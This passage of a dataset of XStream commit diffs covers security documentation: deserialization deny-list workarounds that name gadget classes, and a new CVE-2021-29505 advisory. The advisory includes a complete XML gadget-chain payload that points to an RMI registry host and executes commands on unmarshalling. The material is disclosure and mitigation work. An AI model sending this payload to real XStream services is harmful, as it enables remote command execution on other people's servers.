          "427: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"javax.imageio.ImageIO$ContainsFilter\" });",
          "428: xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });",
          "429: </pre></div>",
          "431:     scratch:</p>",
          "433: xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class, java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class });",
          "435: xstream.denyTypeHierarchy(java.io.InputStream.class);",
          "436: xstream.denyTypeHierarchy(java.nio.channels.Channel.class);",
          "437: xstream.denyTypeHierarchy(javax.activation.DataSource.class);",
          "438: xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class);",
          "439: </pre></div>",
          "440:  <p>Users of XStream 1.4.6 or below can register an own converter to prevent the unmarshalling of the currently",
          "441:  know critical types of the Java runtime. It is in fact an updated version of the workaround for CVE-2013-7285:</p>",
          "442: <div class=\"Source Java\"><pre>xstream.registerConverter(new Converter() {",
          "",
          "[Removed Lines]",
          "409:     possible since XStream 1.4.7 and the default since XStream 1.4.18:</p>",
          "410: <div class=\"Source Java\"><pre>XStream xstream= new XStream();",
          "411: XStream.setupDefaultSecurity(xstream);",
          "413: </pre></div>",
          "414:     <p>Users of XStream 1.4.16 who insist to use XStream default blacklist - despite that clear recommendation - can",
          "418:     <p>Users of XStream 1.4.15 should <strong>additionally</strong> add these lines to the lines from above:</p>",
          "419: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", \"sun.swing.SwingLazyValue\", \"com.sun.corba.se.impl.activation.ServerTableEntry\", \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\" });",
          "420: xstream.denyTypesByRegExp(new String[]{ \".*\\\\$ServiceNameIterator\", \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\", \".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\" });",
          "426:     <p>Users of XStream 1.4.14 and 1.4.13 should <strong>additionally</strong> add these two lines to the lines from above:</p>",
          "430:     <p>Users of XStream 1.4.12 to 1.4.7 who want to use XStream with a blacklist will have to setup such a list from",
          "432: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"javax.imageio.ImageIO$ContainsFilter\", \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", \"com.sun.corba.se.impl.activation.ServerTableEntry\", \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\" });",
          "434: xstream.denyTypesByRegExp(new String[]{ \".*\\\\$ServiceNameIterator\", \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\", \".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\", \".*\\\\$GetterSetterReflection\", \".*\\\\$LazyIterator\", \".*\\\\$PrivilegedGetter\" });",
          "",
          "[Added Lines]",
          "469:     possible since XStream 1.4.7 and it is the default since XStream 1.4.18.</p>",
          "471:     <p>Users of XStream 1.4.17 who insist to use XStream default blacklist - despite that clear recommendation - can",
          "473: <div class=\"Source Java\"><pre>xstream.denyTypesByWildcard(new String[]{ \"sun.reflect.**\", \"sun.tracing.**\", \"com.sun.corba.**\" });",
          "474: xstream.denyTypesByRegExp(new String[]{ \".*\\\\.ws\\\\.client\\\\.sei\\\\..*\", \".*\\\\$ProxyLazyValue\", \"com\\\\.sun\\\\.jndi\\\\..*Enumerat(?:ion|tor),.*\\\\$URLData\" });",
          "475: </pre></div>",
          "477:     <p>Users of XStream 1.4.16 should add these lines and <strong>additionally</strong> the lines for version 1.4.17:</p>",
          "481:     <p>Users of XStream 1.4.15 should add these lines and <strong>additionally</strong> the lines for version 1.4.16 and 1.4.17:</p>",
          "482: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\" });",
          "483: xstream.denyTypesByRegExp(new String[]{ \".*\\\\$ServiceNameIterator\", \"(javax|sun.swing)\\\\..*LazyValue\", \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\", \".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\" });",
          "490:     <p>Users of XStream 1.4.13 and 1.4.14 should add these lines and <strong>additionally</strong> the lines for version 1.4.15 to 1.4.17:</p></p>",
          "495:     <p>Users of XStream 1.4.7 to 1.4.12 who want to use XStream with a blacklist will have to setup such a list from",
          "497: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"javax.imageio.ImageIO$ContainsFilter\", \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\" });",
          "499: xstream.denyTypesByRegExp(new String[]{ \".*\\\\$ServiceNameIterator\", \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\", \".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\", \".*\\\\$GetterSetterReflection\", \".*\\\\$LazyIterator\", \".*\\\\$PrivilegedGetter\",  \".*\\\\.ws\\\\.client\\\\.sei\\\\..*\", \".*\\\\$ProxyLazyValue\", \"com\\\\.sun\\\\.jndi\\\\..*Enumerat(?:ion|tor)\", \".*\\\\$URLData\" });",
          "500: xstream.denyTypesByWildcard(new String[]{ \"sun.reflect.**\", \"sun.tracing.**\", \"com.sun.corba.**\" });",
          "",
          "---------------",
          "--- Hunk 4 ---",
          "[Context before]",
          "444:     return type != null",
          "445:       &amp;&amp; (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class || type == java.lang.Void.class || void.class",
          "446:         || type.getName().equals(\"javax.imageio.ImageIO$ContainsFilter\") || type.getName().equals(\"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\") || type.getName().equals(\"com.sun.corba.se.impl.activation.ServerTableEntry\") || type.getName().equals(\"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\")",
          "448:         || java.io.InputStream.class.isAssignableFrom(type) || java.nio.channels.Channel.isAssignableFrom(type) || javax.activation.DataSource.isAssignableFrom(type) ||javax.sql.rowset.BaseRowSet.isAssignableFrom(type)",
          "449:         || Proxy.isProxy(type));",
          "450:   }",
          "",
          "[Removed Lines]",
          "447:         || type.getName().matches(\"javafx\\\\.collections\\\\.ObservableList\\\\$.*\") || type.getName().matches(\".*\\\\$ServiceNameIterator\")  || type.getName().matches(\".*\\\\$GetterSetterReflection\") || type.getName().matches(\".*\\\\$LazyIterator\") || type.getName().matches(\".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\")",
          "",
          "[Added Lines]",
          "514:         || type.getName().matches(\"javafx\\\\.collections\\\\.ObservableList\\\\$.*\") || type.getName().matches(\".*\\\\$ServiceNameIterator\")  || type.getName().matches(\".*\\\\$GetterSetterReflection\") || type.getName().matches(\".*\\\\$LazyIterator\") || type.getName().matches(\".*\\\\$ProxyLazyValue\") || type.getName().matches(\".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\") || type.getName().matches(\".*\\\\.ws\\\\.client\\\\.sei\\\\..*\") || type.getName().matches(\"com\\\\.sun\\\\.jndi\\\\..*Enumerat(?:ion|tor)\") || type.getName().matches(\".*\\\\$URLData\")",
          "515:         || type.getName().startsWith(\"sun.reflect.\") || type.getName().startsWith(\"sun.tracing.\") || type.getName().startsWith(\"com.sun.corba.\")",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "add7019a3d5d55a324f1eb1939d8884dc7d48a19",
      "candidate_info": {
        "commit_hash": "add7019a3d5d55a324f1eb1939d8884dc7d48a19",
        "repo": "x-stream/xstream",
        "commit_url": "https://github.com/x-stream/xstream/commit/add7019a3d5d55a324f1eb1939d8884dc7d48a19",
        "files": [
          "xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/security.html",
          "xstream/src/java/com/thoughtworks/xstream/XStream.java"
        ],
        "message": "Merge documentation from 1.4.x branch.",
        "before_after_code_files": [
          "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html",
          "xstream/src/java/com/thoughtworks/xstream/XStream.java||xstream/src/java/com/thoughtworks/xstream/XStream.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ],
          "candidate": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ]
        }
      },
      "candidate_diff": {
        "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html": [
          "File: xstream-distribution/src/content/changes.html -> xstream-distribution/src/content/changes.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "101:   <li>No support for Hibernate 3 collections.</li>",
          "102:  </ul>",
          "105:  <h1 id=\"upcoming-1.4.x\">Upcoming 1.4.x maintenance release</h1>",
          "107:  <p>Not yet released.</p>",
          "110:  <h1 id=\"1.4.17\">1.4.17</h1>",
          "",
          "[Removed Lines]",
          "104: <!--",
          "108: -->",
          "",
          "[Added Lines]",
          "108:  <h2>Stream compatibility</h2>",
          "110:  <p class=\"highlight\">Starting with version 1.14.12 nine years ago, XStream contains a",
          "111:  <a href=\"security.html#framework\">Security Framework</a> to implement a black- or whitelist for the allowed types",
          "112:  at deserialization time.  Until version 1.4.17, XStream kept a default blacklist in order to deny all types of the",
          "113:  Java runtime, which are used for all kinds of <a href=\"security.html#CVEs\">security attacks</a>, in order to",
          "114:  guarantee optimal runtime compatibility for existing users.  However, this approach has failed.  The last months",
          "115:  have shown, that the Java runtime alone contains dozens of types that can be used for an attack, not even looking",
          "116:  at the 3rd party libraries on a classpath.  The new version of XStream uses therefore now by default a whitelist,",
          "117:  which is recommended since nine years.  It also has been complaining on the console for a long time about an",
          "118:  uninitialized security framework the first time it was run.  Anyone who has followed the advice and initialized the",
          "119:  security framework for their own scenario can easily update to the new version without any problem. Everyone else",
          "120:  will have to do a proper initialization now, otherwise the new version will fail with certainty at deserialization",
          "121:  time.</p>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html": [
          "File: xstream-distribution/src/content/security.html -> xstream-distribution/src/content/security.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "19:  constructor, call a method to convert an object into XML, then call another method to turn the XML back into an",
          "20:  equivalent Java object.  By design, there are few limits to the type of objects XStream can handle.</p>",
          "25:  <p>This flexibility comes at a price.  XStream applies various techniques under the hood to ensure it is able to",
          "26:   handle all types of objects.  This includes using undocumented Java features and reflection.  The XML generated by",
          "27:   XStream includes all information required to build objects of almost any type.  This introduces a potential",
          "",
          "[Removed Lines]",
          "22:  <p class=highlight>Note: XStream supports other data formats than XML, e.g. JSON. Those formats can be used for",
          "23:  the same attacks.</p>",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "32:  advantage of this to access private data, delete local files, execute arbitrary code or shell commands in the",
          "33:  context of the server running the XStream process or cause a denial of service by crashing the application or",
          "34:  manage to enter an endless loop consuming 100% of CPU cycles.</p>",
          "36:  <p>Note, that the XML data can be manipulated on different levels.  For example, manipulating values on existing",
          "37:   objects (such as a price value), accessing private data, or breaking the format and causing the XML parser to fail.",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "33:  <p class=highlight>Note: XStream supports other data formats than XML, e.g. JSON. Those formats can be used for",
          "34:  the same attacks.</p>",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "183:   <p>All those scenarios were based on types that are delivered with the Java runtime at some version.  Looking at",
          "184:   other well-known and commonly used Java libraries libraries such as ASM, CGLIB, or Groovy, you will have to assume",
          "185:   other scenarios for exploits as well.  A class like InvokerTransformer of Apache Commons Collections has a high",
          "187:   is also your responsibility to protect your clients from such vulnerabilities.</p>",
          "189:  <p>Note: This vulnerability is not even a special problem of XStream.  XML being deserialized by XStream acts here",
          "",
          "[Removed Lines]",
          "186:   potential for attacks.   By default XStream 1.5 works now with a whitelist.  If you modify the default setup, it",
          "",
          "[Added Lines]",
          "186:   potential for attacks.   By default XStream 1.4.18 works now with a whitelist.  If you modify the default setup, it",
          "",
          "---------------",
          "--- Hunk 4 ---",
          "[Context before]",
          "197:  <p class=\"hightlight\">A blacklist for special classes only creates therefore a scenario for a false security,",
          "198:     because no-one can assure, that no other vulnerability is found.  A better approach is the usage of a whitelist",
          "201:     <h2 id=\"explicit\">Explicit Security</h2>",
          "",
          "[Removed Lines]",
          "199:     i.e. the allowed class types are setup explicitly. This is the default for XStream 1.5.x (see below).</p>",
          "",
          "[Added Lines]",
          "199:     i.e. the allowed class types are setup explicitly. This is the default for XStream 1.4.18 (see below).</p>",
          "",
          "---------------",
          "--- Hunk 5 ---",
          "[Context before]",
          "205:  With these permissions it is at least not possible to inject unexpected types into an object graph.  The security",
          "206:  framework supports the setup of a blacklist or whitelist scenario.  Any application should use this feature to",
          "207:  limit the danger of arbitrary command execution if it deserializes data from an external source.</p>",
          "209:  <p>XStream itself sets up a whitelist by default, i.e. it blocks all classes except those types it has explicit",
          "213:  <p class=highlight>Note:  If a type on a whitelist contains itself other members that are handled by XStream, you",
          "214:  will have to add those member's types to the whitelist also.  There is no automatism for indirect references.</p>",
          "",
          "[Removed Lines]",
          "210:  converters for.  Nonetheless, it is still the better approach to maintain an own whitelist for an XStream",
          "211:  instance.  A blacklist scenario should be avoided in general, because it provides a false sense of security.</p>",
          "",
          "[Added Lines]",
          "210:  converters for. Until version 1.4.17 it used a blacklist by default, i.e. it tried to block all currently known",
          "211:  critical classes of the Java runtime.  Main reason for the blacklist were compatibility, it allowed to use newer",
          "212:  versions of XStream as drop-in replacement.  However, this approach has failed.  A growing list of security reports",
          "213:  has proven, that a blacklist is inherently unsafe, apart from the fact that types of 3rd libraries were not even",
          "214:  considered.  XStream provides the ability to setup a whitelist since version 1.4.7, a version released nine years",
          "215:  before 1.4.18.  Clients who have adapted their setup and initialize the security framework are able to use newer",
          "216:  versions again as drop-in replacement.  A blacklist scenario should be avoided in general, because it provides a",
          "217:  false sense of security.</p>",
          "",
          "---------------",
          "--- Hunk 6 ---",
          "[Context before]",
          "231:  <p>Noted above, it might be possible that other combinations are found with the Java runtime itself, or other",
          "232:  commonly-used Java libraries that allow a similar vulnerability like the known case using the Java Beans",
          "233:  EventHandler.  To prevent such a possibility at all, XStream version 1.4.7 and above contains a security framework,",
          "236:  <p>The core interface is <a href=\"javadoc/com/thoughtworks/xstream/security/TypePermission.html\">TypePermission</a>.",
          "237:  The <a href=\"javadoc/com/thoughtworks/xstream/mapper/SecurityMapper.html\">SecurityMapper</a> will evaluate a list",
          "238:  of registered instances for every type that will be required while unmarshalling input data.  The interface has one",
          "",
          "[Removed Lines]",
          "234:  allowing application developers to define which types are allowed to be unmarshalled with XStream.</p>",
          "",
          "[Added Lines]",
          "240:  allowing application developers to define which types are allowed to be unmarshalled with XStream.  Use",
          "241:  <a href=\"javadoc/com/thoughtworks/xstream/XStream.html#setupDefaultSecurity-com.thoughtworks.xstream.XStream-\">XStream.setupDefaultSecurity()</a>",
          "242:  to install the default whitelist of 1.4.18 already with 1.4.7 to 1.4.10.</p>",
          "",
          "---------------",
          "--- Hunk 7 ---",
          "[Context before]",
          "398:     <h2 id=\"workaround\">Workarounds for older XStream versions</h2>",
          "400:     <p>As recommended, use XStream's security framework to implement a whitelist for the allowed types. This is",
          "404: </pre></div>",
          "405:     <p>Users of XStream 1.4.16 who insist to use XStream default blacklist - despite that clear recommendation - can",
          "",
          "[Removed Lines]",
          "401:     possible since XStream 1.4.7 and the default since XStream 1.5.0:</p>",
          "402: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "",
          "[Added Lines]",
          "409:     possible since XStream 1.4.7 and the default since XStream 1.4.18:</p>",
          "410: <div class=\"Source Java\"><pre>XStream xstream= new XStream();",
          "411: XStream.setupDefaultSecurity(xstream);",
          "",
          "---------------"
        ],
        "xstream/src/java/com/thoughtworks/xstream/XStream.java||xstream/src/java/com/thoughtworks/xstream/XStream.java": [
          "File: xstream/src/java/com/thoughtworks/xstream/XStream.java -> xstream/src/java/com/thoughtworks/xstream/XStream.java"
        ]
      }
    },
    {
      "candidate_hash": "f0c4a8d861b68ffc3119cfbbbd632deee624e227",
      "candidate_info": {
        "commit_hash": "f0c4a8d861b68ffc3119cfbbbd632deee624e227",
        "repo": "x-stream/xstream",
        "commit_url": "https://github.com/x-stream/xstream/commit/f0c4a8d861b68ffc3119cfbbbd632deee624e227",
        "files": [
          "xstream-distribution/src/content/CVE-2021-29505.html",
          "xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/security.html",
          "xstream-distribution/src/content/website.xml",
          "xstream/src/java/com/thoughtworks/xstream/XStream.java"
        ],
        "message": "Add description of CVE-2021-29505 and bug fix.",
        "before_after_code_files": [
          "xstream-distribution/src/content/CVE-2021-29505.html||xstream-distribution/src/content/CVE-2021-29505.html",
          "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html",
          "xstream/src/java/com/thoughtworks/xstream/XStream.java||xstream/src/java/com/thoughtworks/xstream/XStream.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "xstream-distribution/src/content/CVE-2021-29505.html||xstream-distribution/src/content/CVE-2021-29505.html",
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ],
          "candidate": [
            "xstream-distribution/src/content/CVE-2021-29505.html||xstream-distribution/src/content/CVE-2021-29505.html",
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ]
        }
      },
      "candidate_diff": {
        "xstream-distribution/src/content/CVE-2021-29505.html||xstream-distribution/src/content/CVE-2021-29505.html": [
          "File: xstream-distribution/src/content/CVE-2021-29505.html -> xstream-distribution/src/content/CVE-2021-29505.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 8. May 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-29505</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-29505: XStream is vulnerable to a Remote Command Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:  <p>All versions until and including version 1.4.16 are affected, if using the version out of the box. No user is",
          "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of a local command on the server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:  unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "38:   &lt;unserializable-parents/&gt;",
          "39:   &lt;java.util.PriorityQueue&gt;",
          "40:     &lt;default&gt;",
          "41:       &lt;size&gt;2&lt;/size&gt;",
          "42:     &lt;/default&gt;",
          "43:     &lt;int&gt;3&lt;/int&gt;",
          "44:     &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "45:       &lt;type&gt;12345&lt;/type&gt;",
          "46:       &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;",
          "47:         &lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &lt;none&gt;&lt;/m__obj&gt;",
          "48:       &lt;/value&gt;",
          "49:     &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "50:     &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "51:       &lt;type&gt;12345&lt;/type&gt;",
          "52:       &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;",
          "53:         &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;",
          "54:           &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;",
          "55:           &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;",
          "56:           &lt;bodyParts/&gt;",
          "57:           &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;",
          "58:             &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;",
          "59:             &lt;multiPart class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;",
          "60:               &lt;soapPart/&gt;",
          "61:               &lt;mm&gt;",
          "62:                 &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;",
          "63:                   &lt;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'&gt;",
          "64:                     &lt;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'&gt;",
          "65:                       &lt;names&gt;",
          "66:                         &lt;string&gt;aa&lt;/string&gt;",
          "67:                         &lt;string&gt;aa&lt;/string&gt;",
          "68:                       &lt;/names&gt;",
          "69:                       &lt;ctx&gt;",
          "70:                         &lt;environment/&gt;",
          "71:                         &lt;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'&gt;",
          "72:                           &lt;java.rmi.server.RemoteObject&gt;",
          "73:                             &lt;string&gt;UnicastRef&lt;/string&gt;",
          "74:                             &lt;string&gt;ip2&lt;/string&gt;",
          "75:                             &lt;int&gt;1099&lt;/int&gt;",
          "76:                             &lt;long&gt;0&lt;/long&gt;",
          "77:                             &lt;int&gt;0&lt;/int&gt;",
          "78:                             &lt;short&gt;0&lt;/short&gt;",
          "79:                             &lt;boolean&gt;false&lt;/boolean&gt;",
          "80:                           &lt;/java.rmi.server.RemoteObject&gt;",
          "81:                         &lt;/registry&gt;",
          "82:                         &lt;host&gt;ip2&lt;/host&gt;",
          "83:                         &lt;port&gt;1099&lt;/port&gt;",
          "84:                       &lt;/ctx&gt;",
          "85:                     &lt;/candidates&gt;",
          "86:                   &lt;/aliases&gt;",
          "87:                 &lt;/it&gt;",
          "88:               &lt;/mm&gt;",
          "89:             &lt;/multiPart&gt;",
          "90:           &lt;/sm&gt;",
          "91:         &lt;/message&gt;",
          "92:       &lt;/value&gt;",
          "93:     &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "94:   &lt;/java.util.PriorityQueue&gt;",
          "95: &lt;/java.util.PriorityQueue&gt;",
          "96: </pre></div>",
          "97: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "98: xstream.fromXML(xml);",
          "99: </pre></div>",
          "101:     <p>As soon as the XML gets unmarshalled, the payload gets executed and the command is executed on the host.</p>",
          "103:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "105:     <h2 id=\"impact\">Impact</h2>",
          "107:  <p>The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by",
          "108:  manipulating the processed input stream.</p>",
          "110:     <h2 id=\"workarounds\">Workarounds</h2>",
          "112:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "114:     <h2 id=\"credits\">Credits</h2>",
          "116:     <p>V3geB1rd, white hat hacker from Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "118:    </body>",
          "119:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html": [
          "File: xstream-distribution/src/content/changes.html -> xstream-distribution/src/content/changes.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "28:   filter for the appropriate milestone.",
          "29:  </p>",
          "32:  <h1 id=\"upcoming-1.4.x\">Upcoming 1.4.x maintenance release</h1>",
          "34:  <p>Not yet released.</p>",
          "37:  <h1 id=\"1.4.16\">1.4.16</h1>",
          "",
          "[Removed Lines]",
          "31: <!--",
          "35: -->",
          "",
          "[Added Lines]",
          "35:  <p class=\"highlight\">This maintenance release addresses the security vulnerability",
          "36:  <a href=\"CVE-2020-26258.html\">CVE-2021-29505</a>, when unmarshalling with XStream instances using an uninitialized",
          "37:  security framework.</p>",
          "39:  <h2>Stream compatibility</h2>",
          "41:  <ul>",
          "42:   <li>The following types are now blacklisted by default and the deserialization",
          "43:   of XML containing one of the two types will fail.  You will have to enable these types by explicit",
          "44:   configuration, if you need them:<br>",
          "45:    <ul>",
          "46:     <li>any type in the java.rmi.* and sun.rmi.* package hierarchies</li>",
          "47:     <li>the individual type com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl</li>",
          "48:    </ul>",
          "49:   </li>",
          "50:  </ul>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html": [
          "File: xstream-distribution/src/content/security.html -> xstream-distribution/src/content/security.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "44:     Exposure (CVE) system managed by the <a href=\"http://www.mitre.org/\">Mitre Corporation</a>. Following a list of the",
          "45:     reported vulnerabilities for the different versions:</p>",
          "48:       <tr>",
          "49:         <th>CVE</th>",
          "50:         <th>Description</th>",
          "51:       </tr>",
          "52:       <tr>",
          "53:         <th>Version 1.4.15</th>",
          "54:         <td></td>",
          "",
          "[Removed Lines]",
          "47:     <table summary=\"Table of reported vulnerabilities daocumented as CVE\">",
          "",
          "[Added Lines]",
          "47:     <table summary=\"Table of reported vulnerabilities documented as CVE\">",
          "52:       <tr>",
          "53:         <th>Version 1.4.16</th>",
          "54:         <td></td>",
          "55:         <td></td>",
          "56:       </tr>",
          "57:       <tr>",
          "58:         <th><a href=\"CVE-2021-29505.html\">CVE-2021-29505</a></th>",
          "59:         <td>XStream is vulnerable to a Remote Command Execution attack.</td>",
          "60:       </tr>",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "378: XStream.setupDefaultSecurity(xstream);",
          "380: </pre></div>",
          "382:     add these lines to XStream's setup code:</p>",
          "383: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", \"sun.swing.SwingLazyValue\", \"com.sun.corba.se.impl.activation.ServerTableEntry\", \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\" });",
          "384: xstream.denyTypesByRegExp(new String[]{ \".*\\\\$ServiceNameIterator\", \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\", \".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\" });",
          "385: xstream.denyTypeHierarchy(java.io.InputStream.class );",
          "",
          "[Removed Lines]",
          "381:     <p>Users of XStream 1.4.14 who insist to use XStream default blacklist - despite that clear recommendation - can",
          "",
          "[Added Lines]",
          "390:     <p>Users of XStream 1.4.16 who insist to use XStream default blacklist - despite that clear recommendation - can",
          "392: <div class=\"Source Java\"><pre>xstream.denyTypesByRegExp(new String[]{ \".*\\\\.Lazy(?:Search)?Enumeration.*\", \"(?:java|sun)\\\\.rmi\\\\..*\" });",
          "393: </pre></div>",
          "394:     <p>Users of XStream 1.4.15 should <strong>additionally</strong> add these lines to the lines from above:</p>",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "387: xstream.denyTypeHierarchy(javax.activation.DataSource.class );",
          "388: xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class );",
          "389: </pre></div>",
          "391: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"javax.imageio.ImageIO$ContainsFilter\" });",
          "392: xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });",
          "393: </pre></div>",
          "",
          "[Removed Lines]",
          "390:     <p>Users of XStream 1.4.13 should <strong>additionally</strong> add these two lines to the lines from above:</p>",
          "",
          "[Added Lines]",
          "402:     <p>Users of XStream 1.4.14 and 1.4.13 should <strong>additionally</strong> add these two lines to the lines from above:</p>",
          "",
          "---------------"
        ],
        "xstream/src/java/com/thoughtworks/xstream/XStream.java||xstream/src/java/com/thoughtworks/xstream/XStream.java": [
          "File: xstream/src/java/com/thoughtworks/xstream/XStream.java -> xstream/src/java/com/thoughtworks/xstream/XStream.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "336:     private static final Pattern IGNORE_ALL = Pattern.compile(\".*\");",
          "337:     private static final Pattern GETTER_SETTER_REFLECTION = Pattern.compile(\".*\\\\$GetterSetterReflection\");",
          "338:     private static final Pattern PRIVILEGED_GETTER = Pattern.compile(\".*\\\\$PrivilegedGetter\");",
          "339:     private static final Pattern LAZY_ITERATORS = Pattern.compile(\".*\\\\$LazyIterator\");",
          "340:     private static final Pattern JAXWS_ITERATORS = Pattern.compile(\".*\\\\$ServiceNameIterator\");",
          "341:     private static final Pattern JAVAFX_OBSERVABLE_LIST__ = Pattern.compile(",
